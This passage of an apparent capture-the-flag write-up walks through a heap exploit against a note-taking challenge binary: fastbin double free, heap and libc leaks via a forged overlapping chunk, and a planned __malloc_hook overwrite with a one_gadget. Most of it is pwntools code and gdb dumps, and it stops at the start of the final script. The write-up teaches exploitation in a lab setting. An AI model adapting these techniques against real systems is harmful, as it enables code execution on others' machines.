+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Index:"</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'0000'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1111'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2222'</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\xf0</span><span style=color:#c2d94c>'</span><span>)
+</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>3</span><span>)
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'will free: '</span><span>)
+</span><span>    heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0xf0
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"heap @ " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span><span>
+</span></code></pre><p>The procedure in which we got leak was -><blockquote><p>free(1), free(2) and then free(0)</blockquote><p>This causes fastbin list to be created in the way <strong>0->2->1</strong> due to the <strong>LIFO</strong> property of fastbins {: .notice}<p>Now when we add another note of size <strong>0x10</strong> , initially it takes out chunk 0 from the fastbins for initialising the header , and then it takes out chunk 2 as even user requested size is <strong>0x10</strong> itself which is the cause of heap leak.<p>From here , we need to analyze memory to get a better perspective of the exploit.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0x555555758000:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Chunk at idx 0
+</span><span style=color:#ffb454>0x555555758010:</span><span>	0x0000555555758150	0x0000000000000010
+</span><span style=color:#ffb454>0x555555758020:</span><span>	0x0000000000000000	0x0000000000000081
+</span><span style=color:#ffb454>0x555555758030:</span><span>	0x0000000030303030	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758040:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758050:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758060:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758070:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758080:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758090:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x5555557580a0:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Chunk at idx 1
+</span><span style=color:#ffb454>0x5555557580b0:</span><span>	0x0000000000000000	0x0000000000000070
+</span><span style=color:#ffb454>0x5555557580c0:</span><span>	0x0000000000000000	0x0000000000000081
+</span><span style=color:#ffb454>0x5555557580d0:</span><span>	0x0000000031313131	0x0000000000000000
+</span><span style=color:#ffb454>0x5555557580e0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555557580f0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758100:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758110:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758120:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758130:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x555555758140:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Chunk at idx 2 , from which we just leaked heap
+</span><span style=color:#ffb454>0x555555758150:</span><span>	0x00005555557580f0	0x0000000000000070
+</span><span style=color:#ffb454>0x555555758160:</span><span>	0x0000000000000000	0x0000000000000081
+</span><span style=color:#ffb454>0x555555758170:</span><span>	0x0000000032323232	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758180:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758190:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555557581a0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555557581b0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555557581c0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span>
+</span><span>
+</span></code></pre><h3 id=pursuing-the-libc>Pursuing the Libc</h3><p><strong>0x21</strong> size is just a fastbin chunk , how do we expect to get libc leak from a fastbin chunk??<p>If we can somehow corrupt the size of this 0x21 chunk with a small bin size , we can get our beloved libc. But how do we do that?<p>The answer to that could be creating <strong>overlapping chunks</strong>.<p>We use our friend <strong>double free</strong> and overwrite fd of a free chunk with our fake chunk's address which can yield our fake chunk overlapping with another chunk whose size we can overwrite. {: .notice}<p>If that didn't hit a nerve , it will soon do :).<p>Let's craft a fake chunk inside of one of our allocated chunks only , some modifications to be made too :)<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
+</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'0000'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1111'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x60 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x21</span><span>))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3333'</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\xf0</span><span style=color:#c2d94c>'</span><span>) </span><span style=font-style:italic;color:#5c6773>#Chunk 4
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>4</span><span>)
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'will free: '</span><span>)
+</span><span>    heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0xf0
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"heap @ " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
+</span><span>
+</span></code></pre><p>Now our fake chunk should reside in the memory.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0x555555758000:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Chunk 0
+</span><span style=color:#ffb454>0x555555758010:</span><span>	0x00005555557580a0	0x0000000000000010
+</span><span style=color:#ffb454>0x555555758020:</span><span>	0x0000000000000000	0x0000000000000081
+</span><span style=color:#ffb454>0x555555758030:</span><span>	0x0000000030303030	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758040:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758050:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758060:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758070:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758080:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758090:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x5555557580a0:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Chunk 1
+</span><span style=color:#ffb454>0x5555557580b0:</span><span>	0x0000555555758000	0x0000000000000070
+</span><span style=color:#ffb454>0x5555557580c0:</span><span>	0x0000000000000000	0x0000000000000081
+</span><span style=color:#ffb454>0x5555557580d0:</span><span>	0x0000000031313131	0x0000000000000000
+</span><span style=color:#ffb454>0x5555557580e0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x5555557580f0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758100:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758110:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758120:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758130:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x555555758140:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Chunk 2 , from which we leaked heap
+</span><span style=color:#ffb454>0x555555758150:</span><span>	0x00005555557580f0	0x0000000000000070 
+</span><span style=color:#ffb454>0x555555758160:</span><span>	0x0000000000000000	0x0000000000000081
+</span><span style=color:#ffb454>0x555555758170:</span><span>	0x3232323232323232	0x3232323232323232
+</span><span style=color:#ffb454>0x555555758180:</span><span>	0x3232323232323232	0x3232323232323232
+</span><span style=color:#ffb454>0x555555758190:</span><span>	0x3232323232323232	0x3232323232323232
+</span><span style=color:#ffb454>0x5555557581a0:</span><span>	0x3232323232323232	0x3232323232323232
+</span><span style=color:#ffb454>0x5555557581b0:</span><span>	0x3232323232323232	0x3232323232323232
+</span><span style=color:#ffb454>0x5555557581c0:</span><span>	0x3232323232323232	0x3232323232323232
+</span><span style=color:#ffb454>0x5555557581d0:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Fake chunk
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x5555557581e0:</span><span>	0x0000000000000000	0x0000000000000021 -</span><span style=color:#f29668>></span><span> Chunk 3 whose size we are interested in corrupting
+</span><span style=color:#ffb454>0x5555557581f0:</span><span>	0x0000555555758210	0x0000000000000070
+</span><span style=color:#ffb454>0x555555758200:</span><span>	0x0000000000000000	0x0000000000000081
+</span><span style=color:#ffb454>0x555555758210:</span><span>	0x0000000033333333	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758220:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758230:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758240:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758250:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758260:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x555555758270:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span>
+</span></code></pre><p>After all this , our fastbin now just <strong>4->1</strong> , call <strong>double free</strong> on chunk 1 to re-add it to fastbin.<p>So our fastbin should look like , <strong>1->4->1</strong> with which we can edit the fd of our chunk 1 and point it to our fake chunk and get our fake chunk after that.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>) </span><span style=font-style:italic;color:#5c6773>#Double Free here
+</span></code></pre><p>If we call <strong>add</strong> now ,it will take our chunk <strong>1</strong> as head which we dont want. so let's free chunk 3 before we call malloc.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>3</span><span>)
+</span></code></pre><p>Now fastbin should be like <strong>3->1->4->1</strong>. Subsequent call to <strong>Add Note</strong> should take chunk <strong>3</strong> for header and chunk <strong>1</strong> for note.<p>We can overwrite the fd with our fake chunk's addr<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    fake_chunk </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1d0
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(fake_chunk)) </span><span style=font-style:italic;color:#5c6773>#5
+</span></code></pre><p>Our fastbin looks like this now , <strong>4->1->fake_chunk</strong>. Let's add one more chunk to fastbin as we need <strong>Add note</strong> to give our fake chunk for writing our data not the header part.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)
+</span></code></pre><p>Now we have <strong>2->4->1->fake_chunk</strong> , two more times <strong>Add note</strong> should give us our fake chunk for writing<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'6666'</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#We get our overlapping chunk
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x10 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xe0</span><span>)) </span><span style=font-style:italic;color:#5c6773>#Faking header's size to small bin
+</span></code></pre><p>We finally can free our small bin chunk to get libc leak.<p>We have to recall that for free , the chunk which is next in memory should also be set appropriately, but here we have the top chunk and hence we face the <strong>corrupted size or Double Free</strong> SIGABART.<p>Ah Snap! , we have to modify our exploit a bit more to move forward , let us add 2 more chunks in the starting so that we dont face this issue.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'0000'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1111'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2222'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x60 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x21</span><span>)) </span><span style=font-style:italic;color:#5c6773>#Contains our fake chunk
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x90</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'4444'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0xd0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'5555'</span><span>)                        </span><span style=font-style:italic;color:#5c6773>#This is to prevent errors in freeing the small bin
+</span><span>    
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)          </span><span style=font-style:italic;color:#5c6773># 2->1
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)          </span><span style=font-style:italic;color:#5c6773># 0->2->1
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Add chunk number 6
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\xf0</span><span style=color:#c2d94c>'</span><span>) </span><span style=font-style:italic;color:#5c6773>#which takes away 0th chunk for header and chunk 2 for note
+</span><span>    
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Send chunk 6 to fastbin and thus get heap leak
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>6</span><span>)    </span><span style=font-style:italic;color:#5c6773># 6->1
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Get heap Leak
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'will free: '</span><span>)
+</span><span>    heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0xf0
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"heap @ " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Now double free chunk 1
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>)         </span><span style=font-style:italic;color:#5c6773># 1->6->1
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#free another chunk to ensure that we get our chunk 1 as note and not the header
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>3</span><span>)         </span><span style=font-style:italic;color:#5c6773># 3->1->6->1 
+</span><span>
+</span><span>    fake_chunk </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x270
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Adding Chunk number 7
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(fake_chunk))   </span><span style=font-style:italic;color:#5c6773>#This takes chunk 3 as header and chunk 1 taken as note , its fd overwritten with fake chunk , 
+</span><span>                                </span><span style=font-style:italic;color:#5c6773># 6->1->fake_chunk
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Free Another chunk such that fake chunk is recieved as note and not as header
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)    </span><span style=font-style:italic;color:#5c6773># 2->6->1->fake_chunk
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Next add , chunk number 8, is just for removing 2 chunks from fastbin
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'8888'</span><span>) </span><span style=font-style:italic;color:#5c6773>#chunk 8 , which takes chunk 2 as header and chunk 6 as its note, now fastbin is left with => 1->fake_chunk
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#We get our overlapping chunk
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xe1</span><span>)) </span><span style=font-style:italic;color:#5c6773># chunk number 9, Faking header's size to small bin , chunk 1 taken as header and fake_chunk returned as overlapping chunk
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Finally free our small bin to populate its fd and bk with libc
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>4</span><span>)
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Add chunk number 10
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x78</span><span style=color:#c2d94c>'</span><span>) </span><span style=font-style:italic;color:#5c6773>#Chunk 10, returned from unsorted bin having fd and bk as libc
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Finally free it to print libc 
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>10</span><span>)
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'will free: '</span><span>)
+</span><span>    libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>)
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'libc_base @ ' </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc_base)) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x3c4b78
+</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span><span>
+</span></code></pre><p>Phew! ,Getting libc was a little tideous , but now we can do the same and get a fastbin of 0x70 size chunk to overwrite <strong>malloc_hook</strong> with <strong>one_gadget</strong>.<p>I changed the script a little bit due to a lot of reasons , one of them being running out of allocations.<p>So now the plan is to fake two 0x71 fastbins so that we can double free yet again and write to the misaligned region near our beloved <strong>__malloc_hook</strong> and finally get shell.<p>Also note that I used double free as a medium of calling malloc as the constraints of <strong>one_gadget</strong> were not satisfying in normal malloc call.<p>Here's the script by the way.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span style=color:#ff7733>import </span><span>sys
+</span><span>
+</span><span>HOST </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'172.35.29.41'
+</span><span>PORT </span><span style=color:#f29668>= </span><span style=color:#f29718>9999
+</span><span>
+</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(HOST</span><span style=color:#bfbab0cc>,</span><span>PORT)
+</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
+</span><span style=color:#ff7733>else</span><span>:
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./pwn'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
+</span><span>
+</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
+</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
+</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
+</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
+</span><span>s </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(a)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>size</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>note</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Choice >>"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"1"</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Size:"</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(size))
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(</span><span style=color:#c2d94c>"Note:"</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(note))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Choice >>"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"2"</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Index:"</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
